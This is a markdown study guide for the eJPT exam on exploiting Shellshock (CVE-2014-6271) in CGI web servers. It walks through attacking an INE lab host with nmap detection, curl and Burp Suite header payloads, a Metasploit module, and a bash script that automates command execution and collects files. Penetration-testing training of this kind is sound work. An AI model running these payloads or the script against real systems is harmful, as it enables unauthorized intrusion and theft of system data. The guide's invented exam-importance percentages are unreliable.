# üî• Shellshock (CVE-2014-6271) Complete Exploitation Guide

**The most critical web application vulnerability in eJPT exam - Master this for guaranteed success!**

**Location:** `07-exploitation/shellshock-exploitation-complete.md`

---

## üìã Table of Contents
1. [What is Shellshock?](#what-is-shellshock)
2. [Vulnerability Impact](#vulnerability-impact)
3. [Detection Methods](#detection-methods)
4. [Exploitation Techniques](#exploitation-techniques)
5. [Real Lab Walkthrough](#real-lab-walkthrough)
6. [eJPT Exam Focus](#ejpt-exam-focus)
7. [Troubleshooting](#troubleshooting)
8. [Reporting](#reporting)

---

## üéØ What is Shellshock?

**Shellshock (CVE-2014-6271)** is a critical security vulnerability in the GNU Bash shell that allows attackers to execute arbitrary commands by manipulating environment variables. This vulnerability is **extremely important for eJPT exam** as it represents a perfect example of web application exploitation.

### üîç How Shellshock Works:
```bash
# Normal function definition in Bash
env x='() { :; }; echo vulnerable' bash -c "echo test"

# What happens:
# 1. Bash processes the environment variable 'x'
# 2. It sees function definition: () { :; }
# 3. BUG: Bash continues executing after function definition
# 4. Result: 'echo vulnerable' gets executed automatically
```

### üí• Why It's Dangerous:
- **Remote Code Execution** without authentication
- **Web servers** with CGI scripts are primary targets
- **HTTP headers** can carry malicious payloads
- **Immediate system compromise** possible

---

## üéØ Vulnerability Impact

### üåê Affected Systems:
| System Type | Risk Level | Common Locations |
|-------------|------------|------------------|
| **Web Servers** | üî¥ Critical | CGI scripts, Apache mod_cgi |
| **DHCP Clients** | üü° High | Network configuration scripts |
| **SSH Servers** | üü° High | ForceCommand configurations |
| **IoT Devices** | üî¥ Critical | Embedded web interfaces |

### üìä CVSS Score: **10.0 (Critical)**
- **Access Vector:** Network
- **Authentication:** None Required  
- **Complexity:** Low
- **Impact:** Complete System Compromise

---

## üîç Detection Methods

### üõ†Ô∏è Method 1: Nmap NSE Scripts (Primary Method)

```bash
# Basic Shellshock detection
nmap --script http-shellshock target.com

# Specify CGI script path (MOST IMPORTANT for eJPT)
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" target.com

# Multiple CGI paths testing
nmap --script http-shellshock --script-args "http-shellshock.uri=/cgi-bin/test.cgi" target.com
```

**üéØ Expected Output for Vulnerable System:**
```
PORT   STATE SERVICE
80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs: CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|     
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
```

### üõ†Ô∏è Method 2: Manual cURL Testing

```bash
# Basic manual test
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'echo VULNERABLE'" http://target.com/cgi-bin/test.cgi

# Test with different headers
curl -H "Cookie: () { :; }; echo; echo; /bin/bash -c 'echo VULNERABLE'" http://target.com/script.cgi
curl -H "Referer: () { :; }; echo; echo; /bin/bash -c 'echo VULNERABLE'" http://target.com/app.cgi
```

### üõ†Ô∏è Method 3: Burp Suite Detection

```bash
# Steps:
# 1. Configure browser proxy to Burp Suite (127.0.0.1:8080)
# 2. Navigate to target web application
# 3. Intercept CGI requests
# 4. Send to Repeater tab
# 5. Modify User-Agent header with test payload
# 6. Look for command execution in response
```

---

## ‚ö° Exploitation Techniques

### üî• Essential Payload Structure

```bash
# Standard Shellshock payload format:
() { :; }; echo; echo; /bin/bash -c 'COMMAND_HERE'

# Breakdown:
# () { :; };     - Function definition that triggers the bug
# echo; echo;    - Two newlines for HTTP response formatting  
# /bin/bash -c   - Shell command execution
# 'COMMAND_HERE' - Your actual command
```

### üéØ Critical Payloads for eJPT Exam

#### 1Ô∏è‚É£ **System Identity Check** (Always test first!)
```bash
() { :; }; echo; echo; /bin/bash -c 'id'

# Expected successful result:
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

#### 2Ô∏è‚É£ **Password File Enumeration** (High value target!)
```bash
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'

# Expected successful result:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
# ... complete user listing
```

#### 3Ô∏è‚É£ **Process Enumeration** (System reconnaissance)
```bash
() { :; }; echo; echo; /bin/bash -c 'ps -ef'

# Expected successful result:
UID    PID  PPID  C STIME TTY    TIME CMD
root     1     0  0 06:21 ?   00:00:00 /usr/bin/python
daemon  16    10  0 06:21 ?   00:00:00 /opt/apache/bin/httpd -X
```

#### 4Ô∏è‚É£ **System Information Gathering**
```bash
() { :; }; echo; echo; /bin/bash -c 'uname -a'
() { :; }; echo; echo; /bin/bash -c 'whoami'
() { :; }; echo; echo; /bin/bash -c 'pwd'
() { :; }; echo; echo; /bin/bash -c 'ls -la /home'
```

---

## üî¨ Real Lab Walkthrough (Step-by-Step)

### üöÄ **Phase 1: Target Discovery & Initial Reconnaissance**

```bash
# Step 1: Initial port scan
nmap demo.ine.local

# Expected Output:
Starting Nmap 7.94SVN at 2024-07-12 11:53 IST
Nmap scan report for demo.ine.local (192.88.83.3)
Host is up (0.00002s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
```

```bash
# Step 2: Web service investigation
curl http://demo.ine.local

# Look for: "Under Construction" page or web application
```

### üîç **Phase 2: CGI Script Discovery**

```bash
# Step 3: Source code analysis (CRITICAL STEP!)
# Navigate to: http://demo.ine.local
# Right-click ‚Üí "View Page Source"
# Look for JavaScript code containing CGI references:

xhr.open("GET", "/gettime.cgi", true);
# This reveals the CGI script path: /gettime.cgi
```

### üéØ **Phase 3: Vulnerability Detection**

```bash
# Step 4: Shellshock vulnerability scan
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local

# Expected Vulnerable Output:
PORT   STATE SERVICE
80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs: CVE:CVE-2014-6271
|     This web application might be affected by the vulnerability known
|     as Shellshock. It seems the server is executing commands injected
|     via malicious HTTP headers.
```

### ‚ö° **Phase 4: Exploitation via Burp Suite**

#### **Step 5: Burp Suite Configuration**
```bash
# Browser Setup:
# 1. Firefox ‚Üí Extensions ‚Üí FoxyProxy
# 2. Select "Burp Suite" profile
# 3. Verify proxy: 127.0.0.1:8080

# Burp Suite Setup:
# 1. Proxy ‚Üí Intercept ‚Üí "Intercept is on"
# 2. Navigate to: http://demo.ine.local
# 3. Reload page to capture /gettime.cgi request
```

#### **Step 6: Request Interception and Manipulation**
```bash
# Original intercepted request:
GET /gettime.cgi HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://demo.ine.local/

# Modified request with Shellshock payload:
GET /gettime.cgi HTTP/1.1
Host: demo.ine.local
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://demo.ine.local/
```

#### **Step 7: Payload Execution and Results**

**üî• Test 1: Password File Enumeration**
```bash
# Payload: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
# Response Body Contains:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin

# ‚úÖ SUCCESS: Complete /etc/passwd file extracted!
```

**üî• Test 2: User Identity Verification**
```bash
# Payload: () { :; }; echo; echo; /bin/bash -c 'id'
# Response Body Contains:
uid=1(daemon) gid=1(daemon) groups=1(daemon)

# ‚úÖ SUCCESS: Running as daemon user confirmed!
```

**üî• Test 3: Process Enumeration**
```bash
# Payload: () { :; }; echo; echo; /bin/bash -c 'ps -ef'
# Response Body Contains:
UID    PID  PPID  C STIME TTY    TIME CMD
root     1     0  0 06:21 ?   00:00:00 /usr/bin/python
root    10    17  0 06:21 ?   00:00:00 /bin/bash /root/startup.sh
daemon  16    10  0 06:21 ?   00:00:00 /opt/apache/bin/httpd -X
daemon  19    18  0 06:21 ?   00:00:00 /opt/apache/bin/httpd -X
daemon 1384  1383  0 06:41 ?   00:00:00 ps -ef

# ‚úÖ SUCCESS: Complete process list obtained!
```

---

## üéØ eJPT Exam Focus (90% Exam Importance!)

### üìä **Critical Success Metrics for eJPT:**

| Skill Area | Importance | Time Allocation | Success Criteria |
|------------|------------|-----------------|------------------|
| **Shellshock Detection** | üî¥ 95% | 5 minutes | NSE script identifies vulnerability |
| **Burp Suite Exploitation** | üî¥ 90% | 10 minutes | Successful command execution |
| **Payload Crafting** | üî¥ 85% | 5 minutes | Multiple payloads work correctly |
| **Evidence Collection** | üî¥ 80% | 3 minutes | Screenshots and outputs saved |

### üèÜ **Master These Commands for Guaranteed Success:**

```bash
# 1. DETECTION (Must memorize!)
nmap --script http-shellshock --script-args "http-shellshock.uri=/SCRIPT_PATH" TARGET

# 2. BASIC TESTING (Practice daily!)
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://TARGET/CGI_SCRIPT

# 3. CRITICAL PAYLOADS (Know by heart!)
() { :; }; echo; echo; /bin/bash -c 'id'                    # Identity check
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'       # Password enumeration  
() { :; }; echo; echo; /bin/bash -c 'ps -ef'                # Process listing
() { :; }; echo; echo; /bin/bash -c 'uname -a'              # System info
```

### üéØ **eJPT Exam Scenarios (Practice These!):**

#### **Scenario 1: Web Application Assessment** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê
```
Situation: Given a web server on port 80, identify and exploit vulnerabilities
Required Skills: Port scanning ‚Üí Service enumeration ‚Üí Vulnerability detection ‚Üí Exploitation
Time Limit: 20 minutes maximum
Success Criteria: 
‚úÖ Identify open ports and services
‚úÖ Discover CGI functionality  
‚úÖ Detect Shellshock vulnerability
‚úÖ Execute commands successfully
‚úÖ Extract sensitive information (/etc/passwd)
```

#### **Scenario 2: CGI Script Exploitation** ‚≠ê‚≠ê‚≠ê‚≠ê
```
Situation: Known web application with CGI functionality, exploit for system access
Required Skills: HTTP header manipulation ‚Üí Payload crafting ‚Üí Command execution
Time Limit: 15 minutes maximum
Success Criteria:
‚úÖ Identify correct injection point (User-Agent header)
‚úÖ Craft working Shellshock payload
‚úÖ Demonstrate remote code execution
‚úÖ Perform system reconnaissance (id, ps, etc.)
```

### üí° **Pro Tips for eJPT Success:**

**üî• Time Management:**
- **Detection Phase:** Maximum 5 minutes
- **Exploitation Phase:** Maximum 10 minutes  
- **Documentation Phase:** Maximum 5 minutes
- **Total Shellshock Task:** Never exceed 20 minutes

**üî• Common Exam Mistakes to Avoid:**
- ‚ùå Forgetting to check source code for CGI script paths
- ‚ùå Using wrong NSE script arguments
- ‚ùå Not testing with simple commands first (like 'id')
- ‚ùå Forgetting to configure Burp Suite proxy correctly
- ‚ùå Not taking screenshots of successful exploitation

**üî• Success Indicators (Know these!):**
- ‚úÖ NSE script shows "VULNERABLE (Exploitable)" 
- ‚úÖ Command execution returns expected output
- ‚úÖ User identity confirmed (usually daemon or www-data)
- ‚úÖ System files accessible (/etc/passwd readable)

### üìù **Quick Reference Cheat Sheet:**

```bash
# DETECTION COMMANDS
nmap -sV TARGET                                              # Service detection
nmap --script http-shellshock TARGET                        # Basic Shellshock scan
nmap --script http-shellshock --script-args "http-shellshock.uri=/PATH" TARGET

# EXPLOITATION PAYLOADS  
() { :; }; echo; echo; /bin/bash -c 'id'                    # Who am I?
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'       # User enumeration
() { :; }; echo; echo; /bin/bash -c 'ps -ef'                # Process enumeration
() { :; }; echo; echo; /bin/bash -c 'ls -la /home'          # Directory listing

# BURP SUITE WORKFLOW
1. Configure FoxyProxy ‚Üí Burp Suite
2. Proxy ‚Üí Intercept ‚Üí "Intercept is on"  
3. Navigate to target ‚Üí Capture request
4. Send to Repeater
5. Modify User-Agent header
6. Click "Send" ‚Üí Analyze response
```

---

## ‚ö†Ô∏è Common Issues & Troubleshooting

### üîß **Issue 1: NSE Script Returns No Results**

**üö® Problem:** Nmap Shellshock script doesn't detect vulnerability on known vulnerable target

**üîç Root Causes:**
- Incorrect CGI script path specified
- Target filtering HTTP headers
- CGI script not executable or accessible

**‚úÖ Solutions:**
```bash
# Try multiple common CGI paths
nmap --script http-shellshock --script-args "http-shellshock.uri=/cgi-bin/test.cgi" TARGET
nmap --script http-shellshock --script-args "http-shellshock.uri=/cgi-bin/status.cgi" TARGET  
nmap --script http-shellshock --script-args "http-shellshock.uri=/scripts/test.cgi" TARGET

# Verify CGI script exists and is accessible
curl -I http://TARGET/gettime.cgi
# Should return: HTTP/1.1 200 OK (not 404 Not Found)

# Test with manual curl request
curl -v -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'echo test'" http://TARGET/gettime.cgi
```

### üîß **Issue 2: Payload Executes But No Output Visible**

**üö® Problem:** Shellshock payload seems to execute but no command output in response

**üîç Root Causes:**
- Missing echo statements in payload
- Output being filtered by web server
- Command syntax errors

**‚úÖ Solutions:**
```bash
# Ensure proper payload formatting with echo statements
() { :; }; echo; echo; /bin/bash -c 'id'
#         ^^^^^ ^^^^^ These are critical for HTTP response formatting

# Test with different commands
() { :; }; echo; echo; /bin/bash -c 'whoami'           # Alternative to 'id'
() { :; }; echo; echo; /bin/bash -c 'echo SUCCESS'     # Simple test command

# Check HTTP response headers and body in Burp Suite
# Look for output in both response headers and body sections
```

### üîß **Issue 3: Burp Suite Proxy Not Working**

**üö® Problem:** Cannot intercept requests in Burp Suite or browser shows connection errors

**üîç Root Causes:**
- Incorrect proxy configuration
- Certificate issues
- Burp Suite not listening on correct port

**‚úÖ Solutions:**
```bash
# Verify Burp Suite proxy settings
# Proxy ‚Üí Options ‚Üí Proxy Listeners
# Ensure: 127.0.0.1:8080 is running and "All interfaces" if needed

# Firefox proxy configuration (FoxyProxy)
# HTTP Proxy: 127.0.0.1 Port: 8080
# HTTPS Proxy: 127.0.0.1 Port: 8080

# Test proxy connection
curl --proxy 127.0.0.1:8080 http://demo.ine.local
# Should show request in Burp Suite HTTP history

# Disable HTTPS certificate validation if needed
# Firefox ‚Üí Settings ‚Üí Privacy & Security ‚Üí View Certificates
```

### üîß **Issue 4: Commands Execute But Return Permission Denied**

**üö® Problem:** Shellshock payload works but commands return "Permission denied" errors

**üîç Root Causes:**
- Limited user privileges (daemon/www-data user)
- SELinux or AppArmor restrictions
- File system permissions

**‚úÖ Solutions:**
```bash
# Check current user capabilities
() { :; }; echo; echo; /bin/bash -c 'id'                    # Check user/group
() { :; }; echo; echo; /bin/bash -c 'pwd'                   # Check current directory
() { :; }; echo; echo; /bin/bash -c 'ls -la'                # Check local permissions

# Try alternative commands that don't require elevated privileges
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'       # Usually readable
() { :; }; echo; echo; /bin/bash -c 'ps aux'                # Process list
() { :; }; echo; echo; /bin/bash -c 'env'                   # Environment variables

# Avoid commands that typically require root privileges
# Don't use: cat /etc/shadow, cat /root/.ssh/id_rsa, etc.
```

---

## üîó Integration with Other Tools

### üîÑ **Primary Workflow: Reconnaissance ‚Üí Shellshock ‚Üí Post-Exploitation**

```bash
# Phase 1: Initial Discovery
nmap -sS -sV -sC TARGET                                     # Comprehensive scan
nmap --script http-enum TARGET                              # Web enumeration

# Phase 2: Shellshock Testing  
nmap --script http-shellshock TARGET                        # Vulnerability detection
curl -H "User-Agent: PAYLOAD" http://TARGET/script.cgi      # Manual verification

# Phase 3: Exploitation
# Use Burp Suite for systematic payload testing
# Document all successful commands and outputs

# Phase 4: Post-Exploitation (if applicable)
# Use gained access for further enumeration
# Look for privilege escalation opportunities
# Gather additional system information
```

### üîÑ **Alternative: Metasploit Integration**

```bash
# Metasploit module for Shellshock (Advanced users)
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS TARGET_IP
set TARGETURI /cgi-bin/vulnerable.cgi
set CMD_MAX_LENGTH 2048
exploit

# Note: Manual exploitation is preferred for eJPT exam
# Metasploit should be secondary option only
```

### üîÑ **Tool Chain Example:**

```bash
# Step 1: Discovery with Nmap
nmap -sV TARGET ‚Üí Identifies web server

# Step 2: Enumeration with dirb/gobuster  
dirb http://TARGET /usr/share/wordlists/dirb/common.txt ‚Üí Finds CGI directories

# Step 3: Shellshock testing
nmap --script http-shellshock TARGET ‚Üí Confirms vulnerability

# Step 4: Exploitation with Burp Suite
Manual payload testing ‚Üí Achieves code execution

# Step 5: Post-exploitation enumeration
Use Shellshock for additional reconnaissance ‚Üí Gather system information
```

---

## üìù Documentation and Reporting

### üìä **Evidence Collection Checklist:**

**üî• Required Screenshots (Take these during exploitation!):**
- [ ] Nmap NSE script output showing vulnerability detection
- [ ] Burp Suite Repeater showing malicious User-Agent header
- [ ] HTTP response containing command execution output  
- [ ] Successful /etc/passwd file extraction
- [ ] Process enumeration results (ps -ef output)
- [ ] User identity confirmation (id command output)

**üî• Command Outputs to Save:**
```bash
# Save all command outputs with timestamps
echo "[$(date)] Nmap Shellshock Detection" > shellshock_evidence.txt
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" TARGET >> shellshock_evidence.txt

echo "[$(date)] Manual Payload Testing" >> shellshock_evidence.txt  
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://TARGET/gettime.cgi >> shellshock_evidence.txt
```

### üìã **Professional Report Template:**

```markdown
# Shellshock Vulnerability Assessment Report

## Executive Summary
Critical Shellshock vulnerability (CVE-2014-6271) identified in target web application, allowing remote code execution without authentication.

## Target Information
- **Target:** demo.ine.local (192.88.83.3)
- **Assessment Date:** July 12, 2024
- **Vulnerability:** CVE-2014-6271 (Shellshock)
- **CVSS Score:** 10.0 (Critical)

## Vulnerability Details

### Discovery Method
```bash
# Automated detection using Nmap NSE
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local

# Result: VULNERABLE (Exploitable) confirmed
```

### Exploitation Evidence
**Injection Point:** User-Agent HTTP header in /gettime.cgi request
**Successful Payloads:**

1. **Identity Verification:**
   ```bash
   Payload: () { :; }; echo; echo; /bin/bash -c 'id'
   Result: uid=1(daemon) gid=1(daemon) groups=1(daemon)
   ```

2. **Sensitive File Access:**
   ```bash
   Payload: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
   Result: Complete user account enumeration successful
   ```

3. **Process Enumeration:**
   ```bash
   Payload: () { :; }; echo; echo; /bin/bash -c 'ps -ef'
   Result: Full process listing obtained, revealing system architecture
   ```

## Risk Assessment
- **Exploitability:** High (Remote, unauthenticated)
- **Impact:** Critical (Complete system compromise possible)
- **Affected Systems:** All CGI-enabled web applications using vulnerable Bash

## Recommendations

### Immediate Actions (Priority 1)
1. **Patch Bash immediately** to version 4.3.30 or later
2. **Disable unnecessary CGI functionality** 
3. **Implement Web Application Firewall** with Shellshock signatures

### Long-term Security Measures (Priority 2)  
1. Regular vulnerability assessments
2. Security code review for all CGI scripts
3. Network segmentation for web servers
4. Monitoring for exploitation attempts

## Proof of Concept
[Include screenshots and detailed step-by-step reproduction steps]

## References
- CVE-2014-6271: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
- NIST NVD: https://nvd.nist.gov/vuln/detail/CVE-2014-6271
- GNU Bash Security Advisory: https://www.gnu.org/software/bash/
```

### ü§ñ **Automated Evidence Collection Script:**

```bash
#!/bin/bash
# Shellshock Assessment and Evidence Collection Script
# Usage: ./shellshock_assess.sh <target_ip> <cgi_script_path>

TARGET=$1
CGI_PATH=$2
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
REPORT_DIR="shellshock_assessment_$TIMESTAMP"

# Create evidence directory
mkdir -p "$REPORT_DIR"

echo "üî• Shellshock Assessment Started - $TARGET" | tee "$REPORT_DIR/assessment.log"
echo "Target: $TARGET" | tee -a "$REPORT_DIR/assessment.log"
echo "CGI Path: $CGI_PATH" | tee -a "$REPORT_DIR/assessment.log"
echo "Timestamp: $(date)" | tee -a "$REPORT_DIR/assessment.log"
echo "=====================================" | tee -a "$REPORT_DIR/assessment.log"

# Phase 1: Vulnerability Detection
echo "Phase 1: Vulnerability Detection" | tee -a "$REPORT_DIR/assessment.log"
nmap --script http-shellshock --script-args "http-shellshock.uri=$CGI_PATH" $TARGET | tee "$REPORT_DIR/nmap_shellshock.txt"

# Phase 2: Manual Exploitation Testing
echo "Phase 2: Manual Exploitation Testing" | tee -a "$REPORT_DIR/assessment.log"

# Test 1: Identity check
echo "Testing payload: id command" | tee -a "$REPORT_DIR/assessment.log"
curl -s -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://$TARGET$CGI_PATH > "$REPORT_DIR/exploit_id.txt"

# Test 2: Password file enumeration  
echo "Testing payload: /etc/passwd" | tee -a "$REPORT_DIR/assessment.log"
curl -s -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://$TARGET$CGI_PATH > "$REPORT_DIR/exploit_passwd.txt"

# Test 3: Process enumeration
echo "Testing payload: process list" | tee -a "$REPORT_DIR/assessment.log"  
curl -s -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'ps -ef'" http://$TARGET$CGI_PATH > "$REPORT_DIR/exploit_processes.txt"

# Test 4: System information
echo "Testing payload: system info" | tee -a "$REPORT_DIR/assessment.log"
curl -s -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'uname -a'" http://$TARGET$CGI_PATH > "$REPORT_DIR/exploit_systeminfo.txt"

# Phase 3: Results Analysis
echo "Phase 3: Results Analysis" | tee -a "$REPORT_DIR/assessment.log"
echo "=====================================" | tee -a "$REPORT_DIR/assessment.log"

# Check for successful exploitation
if grep -q "uid=" "$REPORT_DIR/exploit_id.txt"; then
    echo "‚úÖ SUCCESS: Shellshock exploitation confirmed!" | tee -a "$REPORT_DIR/assessment.log"
    echo "‚úÖ Command execution successful - Remote Code Execution achieved" | tee -a "$REPORT_DIR/assessment.log"
else
    echo "‚ùå FAILED: No evidence of successful exploitation" | tee -a "$REPORT_DIR/assessment.log"
fi

if grep -q "root:" "$REPORT_DIR/exploit_passwd.txt"; then
    echo "‚úÖ SUCCESS: /etc/passwd file extracted successfully" | tee -a "$REPORT_DIR/assessment.log"
    USER_COUNT=$(grep -c ":" "$REPORT_DIR/exploit_passwd.txt")
    echo "üìä Information: $USER_COUNT user accounts discovered" | tee -a "$REPORT_DIR/assessment.log"
else
    echo "‚ùå FAILED: Unable to extract /etc/passwd file" | tee -a "$REPORT_DIR/assessment.log"
fi

if grep -q "PID" "$REPORT_DIR/exploit_processes.txt"; then
    echo "‚úÖ SUCCESS: Process enumeration completed" | tee -a "$REPORT_DIR/assessment.log"
    PROCESS_COUNT=$(grep -c "root\|daemon\|www-data" "$REPORT_DIR/exploit_processes.txt")
    echo "üìä Information: $PROCESS_COUNT processes identified" | tee -a "$REPORT_DIR/assessment.log"
else
    echo "‚ùå FAILED: Process enumeration unsuccessful" | tee -a "$REPORT_DIR/assessment.log"
fi

# Generate summary report
echo "=====================================" | tee -a "$REPORT_DIR/assessment.log"
echo "üéØ ASSESSMENT SUMMARY" | tee -a "$REPORT_DIR/assessment.log"
echo "Target: $TARGET" | tee -a "$REPORT_DIR/assessment.log"
echo "Vulnerability: CVE-2014-6271 (Shellshock)" | tee -a "$REPORT_DIR/assessment.log"
echo "Assessment Date: $(date)" | tee -a "$REPORT_DIR/assessment.log"
echo "Evidence Location: $REPORT_DIR/" | tee -a "$REPORT_DIR/assessment.log"
echo "=====================================" | tee -a "$REPORT_DIR/assessment.log"

echo "üî• Assessment completed! Check $REPORT_DIR/ for all evidence files."
echo "üìù Files generated:"
ls -la "$REPORT_DIR/"
```

---

## üìö Additional Resources & Further Learning

### üéì **Official Documentation & References:**

| Resource Type | Link | Description |
|---------------|------|-------------|
| **CVE Database** | [CVE-2014-6271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271) | Official CVE entry with technical details |
| **NIST NVD** | [NVD CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271) | NIST vulnerability database entry |
| **GNU Bash** | [Bash Security Advisory](https://www.gnu.org/software/bash/) | Official Bash project security information |
| **Nmap NSE** | [http-shellshock.nse](https://nmap.org/nsedoc/scripts/http-shellshock.html) | Official NSE script documentation |

### üî¨ **Advanced Learning Resources:**

#### **Research Papers & Analysis:**
- **"Shellshock: How we discovered it, what it does and why it's significant"** - Stephane Chazelas (Original discoverer)
- **"The Shellshock Bug: The Bash vulnerability and its exploitation"** - SANS Institute
- **"CVE-2014-6271 Analysis and Exploitation Techniques"** - SecurityFocus

#### **Video Tutorials & Courses:**
- **Cybrary:** "Web Application Penetration Testing" - Shellshock module
- **YouTube:** "Shellshock Exploitation Tutorial" by LiveOverflow
- **Udemy:** "eJPT Certification Course" - Web exploitation section

#### **Practice Labs & Environments:**
- **VulnHub:** Shellshock vulnerable VMs for practice
- **TryHackMe:** "Shellshock" room for hands-on practice
- **HackTheBox:** Various machines with Shellshock vulnerabilities
- **DVWA:** Damn Vulnerable Web Application with CGI functionality

### üõ†Ô∏è **Related Tools & Techniques:**

#### **Alternative Exploitation Tools:**
| Tool | Purpose | Usage Example |
|------|---------|---------------|
| **Metasploit** | Automated exploitation | `use exploit/multi/http/apache_mod_cgi_bash_env_exec` |
| **Shocker.py** | Standalone Shellshock scanner | `python shocker.py --Host target --cgi /cgi-bin/test.cgi` |
| **Custom Scripts** | Tailored exploitation | Bash/Python scripts for specific scenarios |

#### **Defensive Tools:**
| Tool | Purpose | Detection Method |
|------|---------|------------------|
| **ModSecurity** | WAF protection | Rules to detect Shellshock patterns |
| **Snort/Suricata** | Network IDS | Signatures for Shellshock exploitation |
| **YARA Rules** | Malware detection | Pattern matching for Shellshock payloads |

### üîÑ **Shellshock Variants & Related CVEs:**

#### **Related Vulnerabilities:**
- **CVE-2014-6277:** Related Bash vulnerability (off-by-one error)
- **CVE-2014-6278:** Another Bash parsing vulnerability  
- **CVE-2014-7169:** Incomplete fix for original Shellshock
- **CVE-2014-7186:** Additional Bash vulnerability discovered
- **CVE-2014-7187:** Parser hang vulnerability in Bash

#### **Evolution of Patches:**
```bash
# Check Bash version and patch level
bash --version

# Vulnerable versions:
# GNU bash, version 1.14.0 through 4.3 (unpatched)

# Patched versions:
# GNU bash, version 4.3.30 and later
# Or earlier versions with security patches applied
```

### üèÜ **eJPT Exam Preparation Roadmap:**

#### **Week 1-2: Foundation Building**
- [ ] Study HTTP protocol and CGI functionality
- [ ] Practice Nmap NSE scripts and port scanning
- [ ] Learn Burp Suite proxy configuration and usage
- [ ] Understand Bash shell and environment variables

#### **Week 3-4: Shellshock Mastery**  
- [ ] Practice Shellshock detection on vulnerable VMs
- [ ] Master payload crafting and command execution
- [ ] Document 50+ successful exploitation attempts
- [ ] Time yourself: Achieve sub-15 minute exploitation

#### **Week 5-6: Integration & Scenarios**
- [ ] Practice full penetration testing workflows
- [ ] Combine Shellshock with other web vulnerabilities
- [ ] Create comprehensive reports and documentation
- [ ] Take practice eJPT exams focusing on web exploitation

#### **Final Week: Exam Readiness**
- [ ] Review all Shellshock commands and payloads
- [ ] Practice under time pressure (15-20 minutes max)
- [ ] Ensure all tools are configured correctly
- [ ] Memorize critical success indicators and outputs

### üéØ **Success Metrics & Benchmarks:**

#### **Beginner Level (First Month):**
- ‚úÖ Successfully detect Shellshock using Nmap NSE
- ‚úÖ Execute basic payloads using curl
- ‚úÖ Extract /etc/passwd file consistently
- ‚úÖ Understand HTTP request/response structure

#### **Intermediate Level (2-3 Months):**
- ‚úÖ Master Burp Suite exploitation workflow
- ‚úÖ Craft custom payloads for different scenarios
- ‚úÖ Integrate Shellshock with other reconnaissance techniques
- ‚úÖ Complete exploitation in under 20 minutes

#### **Advanced Level (eJPT Ready):**
- ‚úÖ Detect and exploit Shellshock in under 15 minutes
- ‚úÖ Handle edge cases and troubleshoot issues quickly
- ‚úÖ Document findings professionally
- ‚úÖ Teach others the exploitation process

### üîÆ **Beyond eJPT: Advanced Exploitation:**

#### **Red Team Techniques:**
- **Persistence:** Using Shellshock for backdoor installation
- **Lateral Movement:** Exploiting internal CGI applications
- **Data Exfiltration:** Leveraging command execution for data theft
- **Evasion:** Bypassing WAF and IDS systems

#### **Blue Team Defense:**
- **Detection:** Monitoring for Shellshock exploitation attempts
- **Response:** Incident response procedures for compromise
- **Prevention:** Hardening web servers and CGI applications
- **Forensics:** Analyzing logs for Shellshock indicators

---

